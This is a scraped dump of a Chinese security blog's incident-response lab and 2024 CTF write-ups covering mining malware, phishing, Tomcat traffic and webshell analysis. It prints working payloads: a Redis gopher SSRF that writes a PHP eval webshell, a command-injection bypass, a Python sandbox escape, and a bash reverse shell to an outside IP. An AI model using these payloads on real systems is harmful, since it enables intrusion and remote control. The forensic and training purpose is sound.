D 盾里面扫描 flag{404.php-cmd} 4、黑客提权后设置的后门文件名称是？ 看一下root的.bash_history 设置了find命令 flag{/usr/bin/find} 5、对黑客上传的挖矿病毒进行分析，获取隐藏的Flag 一般挖矿任务会设置在定时任务里面 cat /etc/crontab find / -name \"ldm\" cat /etc/.cache/ldm 找到一串关键代码 nohup python2 -c \"import base64;exec(base64.b64decode('aW1wb3J0IHRpbWUKd2hpbGUgMToKICAgIHByaW50KCJmbGFne3dlYnNlY19UcnVlQDg4OCF9IikKICAgIHRpbWUuc2xlZXAoMTAwMCk='))\" \u003e/dev/null 2\u003e\u00261 解密看一下 flag{websec_True@888!} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/:2:0","tags":["Linux 挖矿"],"title":"第五章-Linux实战-挖矿","uri":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" Tips时间文件排查 find / -newerct '2024-01-24 08:10:00' ! -newerct '2024-01-24 09:10:00' ! -path '/proc/*' ! -path /'sys/*' ! -path '/run/*' -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null 敏感目录排查 find /tmp ! -type d -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null HOME目录排查 find $HOME ! -type d -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null 特权文件排查 find / -perm -u=s 2 -type f -ls \u003e/dev/null 所有进程排查 pstree -as 隐藏进程排查 ps -ef | awk '{print}' | sort | uniq \u003e 1 ps -ef | awk '{print}' | sort | uniq \u003e 2 diff 1 2 计划任务排查 find /var/spool/cron/ -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null find /etc/*cron* -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null 启动项排查 find /etc/rc.d/ -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null 自启服务排查 chkconfig --list service --status-all 命令别名排查 alias find / -name *bashrc* -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/:3:0","tags":["Linux 挖矿"],"title":"第五章-Linux实战-挖矿","uri":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":"1、通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交; cat /var/log/auth.log.1 flag{183.164.3.252} 2、通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交; cat /etc/passwd中并无可疑用户 cat /root/.ssh/authorized_keys flag{mdrfckr} 3、通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交; 权限维持一般是定时任务 看一下这几个文件是否是恶意文件， 利用stat看一下时间 只有/root/.X291-unix/.rsync/c/aptitude符合 Linux 主机被入侵的时间。 可以确定定时任务做了权限维持 md5sum /var/spool/cron/crontabs/root flag{cc84a750dcfb988861c8bf90aa15c039} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-kswapd0%E6%8C%96%E7%9F%BF/:0:0","tags":["挖矿"],"title":"第九章-Kswapd0挖矿","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-kswapd0%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" 定时任务 我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。 /var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名 /etc/crontab 这个文件负责调度各种管理和维护任务。 /etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。 我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-kswapd0%E6%8C%96%E7%9F%BF/:1:0","tags":["挖矿"],"title":"第九章-Kswapd0挖矿","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-kswapd0%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" 0x00 环境分析 服务器场景操作系统 Linux 服务器账号密码 root password ssh端口222 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-algo%E6%8C%96%E7%9F%BF/:1:0","tags":["挖矿"],"title":"第九章-Algo挖矿","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-algo%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" 0x011、通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交; cat /var/log/auth.log.1 flag{172.20.10.3} 2、通过本地 PC SSH到服务器并且分析黑客挖矿程序反链 IP 为多少,将黑客挖矿程序反链的 IP 作为 FLAG 提交; 一般在定时任务 cat /var/spool/cron/crontabs/root 这个就是挖矿木马，运行一下看看 lsof /usr/bin/dhpcd pid是765 netstat -tunlap | grep 765 这几个 IP 应该是上线的 c2和挖矿程序反链 IP，但都不是最终flag， 挖矿程序一直在更新，所以反链ip也有变化，flag 仍然是之前的ip flag{139.99.125.38} 3、通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交; 做了权限维持的应该就是上面那个定时任务 flag{7b9a3a8a9e47e5c9675278420e6e7fa0} 4、通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交; cat /etc/passwd里面并没有用户 cat /root/.ssh/authorized_keys flag{otto} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-algo%E6%8C%96%E7%9F%BF/:2:0","tags":["挖矿"],"title":"第九章-Algo挖矿","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-algo%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" 0x00 环境分析 服务器场景操作系统 Linux 服务器账号密码 root root123 result.pcap ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/:1:0","tags":["Linux"],"title":"第九章-实战篇-运维杰克","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/"},{"categories":["应急响应"],"content":" 0x011、攻击者使用的的漏洞扫描工具有哪些(两个) flag{xxxan-xxxy} 查询apache日志看一下哪两个ip访问最多 cut -d- -f 1 access.log.1 | sort -nr | uniq -c | sort -nr 可以看到192.168.150.1和192.168.150.2 利用wireshark查一下这两个ip的流量 ip.src_host == 192.168.150.1 \u0026\u0026 tcp \u0026\u0026 !ssh \u0026\u0026 !http options固定长度4 02 04 05 b4，并且为TCP半连接，符合nmap扫描特征 查询一下HTTP流量，发现了大量的漏洞扫描流量 在/apply_sec.cgi中发现了goby特征，确定为goby扫描器 ip.src_host == 192.168.150.2 \u0026\u0026 tcp \u0026\u0026 !ssh \u0026\u0026 !http 按照时间排序，可以看到开始发送了大量扫描端口的流量 这里跟踪一下22端口 可以看到是一次完整的TCP请求， 利用了icmp echo探测存活 同时也进行了大量的漏洞扫描 漏洞特征为fscan flag{fscan-goby} 2、攻击者上传webshell的绝对路径及User-agent netstat -ano看一下开放的业务 压缩/var/www/html目录的文件 放到D盾扫描 打开文件看到反弹ip与port 在流量中找一下如何上传了这个文件 User-Agent是my_is_user_agent flag{14bea1643a4b97600ba13a6dd5dbbd04} 3、攻击者反弹shell的IP及端口是什么 flag{192.168.150.110:5678} 4、攻击者利用提权攻击添加的用户，用户名是什么 cat /etc/passwd flag{zhangsan} 4、攻击者留下了后门脚本，找到绝对路径(有SUID权限) find / -perm 4000 -u=s -type f 2\u003e/dev/null flag{/var/www/html/lot/admin/assets/vendor/.shell/.decodeshell.php} 5、攻击者留下了持续化监控和后门脚本，找到绝对路径 根据题目描述，查看定时任务 crontab -l cat /opt/.script/.script.sh flag{/opt/.script/.script.sh} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/:2:0","tags":["Linux"],"title":"第九章-实战篇-运维杰克","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/"},{"categories":["CTF"],"content":" easyweb访问/flag.php，发现源码加密的代码.zip 下载下来，进行绕过 \u003c?php if (isset($_GET['id']) \u0026\u0026 floatval($_GET['id']) !== '1' \u0026\u0026 $_GET['id'] == 1) { echo 'welcome,admin'; $_SESSION['admin'] = True; } else { die('flag?'); } ?\u003e \u003c?php if ($_SESSION['admin']) { if(isset($_POST['code'])) { if(preg_match(\"/(ls|c|a|t| |f|i|n|d')/\", $_POST['code'])==1) echo 'no!'; elseif(preg_match(\"/[@#%^\u0026*()|\\/?\u003e\u003c']/\",$_POST['code'])==1) echo 'no!'; else system($_POST['code']); } } ?\u003e POST /index.php?id=0.999999999999999999 HTTP/1.1 Host: web-fe24daddc0.challenge.xctf.org.cn Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 12 code=l\"\"s%0a 访问/7l8g得到flag ","date":"2024-06-05","objectID":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/:1:0","tags":["矩阵杯WriteUp"],"title":"2024-矩阵杯WebWriteUp","uri":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/"},{"categories":["CTF"],"content":" where/look?file=存在任意文件读取，读取/root/.bash_history ","date":"2024-06-05","objectID":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/:2:0","tags":["矩阵杯WriteUp"],"title":"2024-矩阵杯WebWriteUp","uri":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/"},{"categories":["CTF"],"content":" tantantan访问/aaabbb.php POST data=file:///var/www/html/aaabbb.php 读取源码 \u003c?php error_reporting(0); // error_reporting(E_ALL \u0026 ~E_WARNING); // highlight_file(__FILE__); $url=$_POST['data']; $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ?\u003e dict://127.0.0.1:6379发现存在redis服务 \u0008利用gopher打redis POST /aaabbb.php HTTP/1.1 Host: web-da58846781.challenge.xctf.org.cn Content-Length: 26 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://web-da58846781.challenge.xctf.org.cn Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://web-da58846781.challenge.xctf.org.cn//aaabbb.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close data=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_REQUEST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A 生成shell.php 访问/shell.php?1=system('cat /9jsh267sbh1312h7dn2'); 获得flag ","date":"2024-06-05","objectID":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/:3:0","tags":["矩阵杯WriteUp"],"title":"2024-矩阵杯WebWriteUp","uri":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/"},{"categories":["CTF"],"content":" WHAT_CAN_I_SAY有一些过滤，先把它注释掉，然后进行绕过 #!/usr/local/bin/python3 # First Line of docker file -\u003e FROM ubuntu:23.04 import os import subprocess import sys from tempfile import TemporaryDirectory WELCOME = r''' __ ___ _ _______ _____ _ _ _____ _____ __ __ \\ \\ / / | | | /\\|__ __| / ____| /\\ | \\ | | |_ _| / ____| /\\\\ \\ / / \\ \\ /\\ / /| |__| | / \\ | | | | / \\ | \\| | | | | (___ / \\\\ \\_/ / \\ \\/ \\/ / | __ | / /\\ \\ | | | | / /\\ \\ | . ` | | | \\___ \\ / /\\ \\\\ / \\ /\\ / | | | |/ ____ \\| | | |____ / ____ \\| |\\ | _| |_ ____) / ____ \\| | \\/ \\/ |_| |_/_/ \\_\\_| \\_____/_/ \\_\\_| \\_| |_____| |_____/_/ \\_\\_| ''' basecode = ''' # safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in \"_-abcdefghijklmnopqrstuvwxyz\"} # del __builtins__ # try:exec(code,safebuiltins_dict,{}) # except:pass exec(code) ''' def main(workdir): print(\"Make `input equals output` but with some rules!\") print(\"1. Not allow to use some special chars -\u003e like unicode\") print(\"2. Code length less than 666\") print(\"3. Make sure 'what.can.i.say' in your code that makes Kobe like you!\") print(\"4. Pls input your code which end with \u003cEOF\u003e\") print(\"Good luck!\") os.chdir(workdir) os.mkdir(\"runsbox\") code = \"\" tmp_input = [] while (x := input(\"\u003e\u003e\u003e \")) != \"\u003cEOF\u003e\": tmp_input.append(x) code = \"\\n\".join(m for m in tmp_input) # assert 0 \u003c len(code) \u003c 666, \"Boy your code is too long!!!!!\" # assert all(i not in code for i in list(\"'\\\"_{}#\")), \"I don't like those chars...\" # assert \"import\" not in code,\"Boy, this isn't funny!\" # assert \"what.can.i.say\" in code, \"Mamba out!\" # assert all(10 \u003c= ord(c) \u003c= 127 for c in code), \"pls using ascii code boy!\" try: with open(\"runbox.py\", \"w+\") as f: f.write(f\"\"\"#!/usr/local/bin/python3 {code = } {basecode} \"\"\") runsbx_handle = subprocess.run( \"/usr/bin/python3 runbox.py\", shell=True, capture_output=True, encoding=\"utf-8\", ) except Exception: sys.stderr.write(\"run sandbox error!\\n\") os._exit(0) if ( len(runsbx_handle.stdout) and len(runsbx_handle.stderr) and runsbx_handle.stdout == runsbx_handle.stderr == code ): # with open(\"/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx\") as f: # sys.stdout.write(f.read()) print(\"bypass\") else: sys.stderr.write(\"Man what can i say?\\n\") if __name__ == \"__main__\": print(WELCOME) with TemporaryDirectory() as workdir: main(workdir) 参考文章 https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c https://xz.aliyun.com/t/13635 a=(a.gi_frame.f_back.f_back for i in [1]) a=[x for x in a][0] globals=a.f_back.f_globals code = globals['code'] exec('__import__(\"sys\").stdout.write(code)') exec('__import__(\"sys\").stderr.write(code)') 接下来想办法绕过如下两处代码 safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in \"_-abcdefghijklmnopqrstuvwxyz\"} del __builtins__ try:exec(code,safebuiltins_dict,{}) except:pass assert 0 \u003c len(code) \u003c 666, \"Boy your code is too long!!!!!\" assert all(i not in code for i in list(\"'\\\"_{}#\")), \"I don't like those chars...\" assert \"import\" not in code,\"Boy, this isn't funny!\" assert \"what.can.i.say\" in code, \"Mamba out!\" assert all(10 \u003c= ord(c) \u003c= 127 for c in code), \"pls using ascii code boy!\" 先看第一处 safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in \"_-abcdefghijklmnopqrstuvwxyz\"} del __builtins__ try:exec(code,safebuiltins_dict,{}) except:pass 这个过滤大概意思就是删除了__builtins__，但是保留了一些函数 第二处 assert 0 \u003c len(code) \u003c 666, \"Boy your code is too long!!!!!\" assert all(i not in code for i in list(\"'\\\"_{}#\")), \"I don't like those chars...\" assert \"import\" not in code,\"Boy, this isn't funny!\" assert \"what.can.i.say\" in code, \"Mamba out!\" assert all(10 \u003c= ord(c) \u003c= 127 for c in code), \"pls using ascii code boy!\" 限制了code的长度在0-666之前，并且限制了一些特殊字符'\\\"_{}#，并且ascii码需要在10-127之前，包含what.can.i.say 构造exp g=chr(103) i=chr(105) k=chr(95) f=chr(102) r=chr(114) a=chr(97) m=chr(109) e=chr(101) b=chr(98) c=chr(99) l=chr(108) o=chr(111) s=chr(115) d=chr(100) k1=chr(107) p=chr(112) t=chr(116) t1=chr(40) t2=chr(34) t3=chr(41) y=chr(121) d1=chr(46) u=chr(117) w=chr(119) G=g+i+k+f+r+a+m+e F=f+k+b+a+c+k1 GL=f+k+g+l+o+b+a+l+s CO=c+o+d+e i1=k+k+i+m+p+o+r+t+k+k+t1+t2+s+y+s+t2+t3+d1+s+t+d u=o+u+t i2=d1+w+r+i+t+e+t1+a+t3 r=e+r+r def a(): global G,F,GL,CO def b(): yield getattr(getattr(getattr(c,G),F),F) c = b() z = getattr(getattr(next(c),F),GL)[CO] return z a = a() exec(i1+u+i2) exec(i1+r+i2) try: what.can.i.say except: pass 成功绕过 exp.py import subprocess import os import sys code = ''' g=chr(103) i=chr(105) k=chr(95) f=chr(102) r=chr(114) a=chr(97) m=chr(109) e=chr(101) b=chr(98) c=chr(99) l=chr(108) o=chr(111) s=chr(115) d=chr(100) k1=chr(107) p=chr(112) t=chr(116) t1=chr(40) t2=chr(34) t3=chr(41) y=chr(121) d1=chr(46) u=chr(117) w=chr(119) G=g+i+k+f+r+a+m+e F=f+k+b+a+c+k1 GL=f+k+g+l+o+b+a+l+s CO=c+o+d+e i1=k+k+i+m+p+o+r+t+k+k+t1+t2+s+y+s+t2+t3+d1+s+t+d u=o+u+t i2=d1+w+r+i+t+e+t1+a+t3 r=e+r+r def a(): global G,F,GL,CO def b(): yield getattr(getattr(getattr(c,G),F),F) c = b() z = getattr(getattr(next(c),F),GL)[CO] return z a = a() exec(i1+u+i2) exec(i1+r+i2) try: what.can.i.say except: pass ''' basecode = ''' safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in \"_-abcdefghijklmnopqrstuvwxyz\"} del __builtins__ try:exec(code,safebuiltins_dict,{}) except Exception as e:print(e) ''' assert 0 \u003c len(code) \u003c 666, \"Boy your code is too long!!!!!\" assert all(i not in code for i in list(\"'\\\"_{}#\")), \"I don't like those chars...\" assert \"import\" not in code,\"Boy, this isn't funny!\" assert \"what.can.i.say\" in code, \"Mamba out!\" assert all(10 \u003c= ord(c) \u003c= 127 for c in code), \"pls using ascii code boy!\" try: with open(\"./runbox1.py\", \"w+\") as f: f.write(f\"\"\"#!/usr/local/bin/python3 {code = } {basecode} \"\"\") runsbx_handle = subprocess.run( \"/usr/bin/python3 ./runbox1.py\", shell=True, capture_output=True, encoding=\"utf-8\", ) except Exception: sys.stderr.write(\"run sandbox error!\\n\") os._exit(0) if ( len(runsbx_handle.stdout) and len(runsbx_handle.stderr) and runsbx_handle.stdout == runsbx_handle.stderr == code ): # with open(\"/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx\") as f: # sys.stdout.write(f.read()) print(\"bypass\") else: sys.stderr.write(\"Man what can i say?\\n\") ","date":"2024-06-05","objectID":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/:4:0","tags":["矩阵杯WriteUp"],"title":"2024-矩阵杯WebWriteUp","uri":"/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/"},{"categories":["应急响应"],"content":" 0x00环境分析 请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44} 请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44} 黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php} flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/:1:0","tags":["钓鱼邮件"],"title":"第七章-常见攻击事件分析-钓鱼邮件","uri":"/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/"},{"categories":["应急响应"],"content":" 0x011、请分析获取黑客发送钓鱼邮件时使用的IP 在钓鱼邮件.eml中看到ip flag{121.204.224.15} 2、请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP 将eml中传输的文件进行恢复 import base64 with open(\"base64.txt\",\"r\") as f: result = f.read().strip().replace(\"\\n\",\"\") with open(\"kill.exe\",\"wb\") as f: f.write(base64.b64decode(result)) 上传到微步查杀中 flag{107.16.111.57} 3、黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式 利用D盾扫描 验证一下 flag{/var/www/html/admin/ebak/ReData.php} 4、黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径 发现mysql.conf 同目录下的mysql文件很可能就是内网代理工具 flag{/var/tmp/proc/mysql} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/:2:0","tags":["钓鱼邮件"],"title":"第七章-常见攻击事件分析-钓鱼邮件","uri":"/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/"},{"categories":["应急响应"],"content":" 0x00 环境分析 1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag{127.0.0.1} 2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写} 3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222} 4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称} 5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123} 6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt} 7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息 ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-tomcat/:1:0","tags":["tomcat流量分析"],"title":"第六章-流量特征分析-常见攻击事件Tomcat","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-tomcat/"},{"categories":["应急响应"],"content":" 0x011、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP 过滤一下http请求，在按照Source排序http.request==1 可以看到14.0.0.120这个ip请求次数很多，而且很多都是可疑请求， flag{14.0.0.120} 2、找到攻击者IP后请通过技术手段确定其所在地址 ip138查询ip地址 flag{guangzhou} 3、哪一个端口提供对web服务器管理面板的访问？ 可以看到黑客一直在爆破8080端口 所以8080端口便是tomcat的管理面板 4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ 随便点了几个黑客扫描的请求，发现其User-Agent中存在请求头 flag{gobuster} 5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ 黑客在爆破tomcat的管理面板，这里过滤请求 http.request.uri==\"/manager/html\" || http.response == 1 再按照时间排序 YWRtaW46dG9tY2F0解密得到admin:tomcat flag{admin-tomcat} 6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ 看到了请求/upload目录 发送了一个JXQOZY.war文件 flag{JXQOZY.war} 8、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ 题目描述是维权，所以搜索一下关键信息/bin tcp contains \"/bin\" 可以看到是定时任务进行了权限维持 flag{/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/14.0.0.120/443 0\u003e\u00261'} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-tomcat/:2:0","tags":["tomcat流量分析"],"title":"第六章-流量特征分析-常见攻击事件Tomcat","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-tomcat/"},{"categories":["应急响应"],"content":" 0x00 环境分析 1. 管理员Admin账号的密码是什么？ 2. LSASS.exe的程序进程ID是多少？ 3. 用户WIN101的密码是什么? ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/:1:0","tags":["流量分析"],"title":"第六章-流量特征分析-蚂蚁爱上树","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/"},{"categories":["应急响应"],"content":" 0x01/onlineshop/product2.php蚁剑马，对流量进行解密 cd /d \"C:/phpStudy/PHPTutorial/WWW/onlineshop\"\u0026ls\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026dir\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026whoami\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026whoami /priv\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026systeminfo\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026dir c:\\\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026dir c:\\temp\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net user\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net localgroup administrators\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net group \"domain group\" /domain\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net group \"domain admins\" /domain\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net view\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net share\u0026echo [S]\u0026cd\u0026echo [E] cd /d 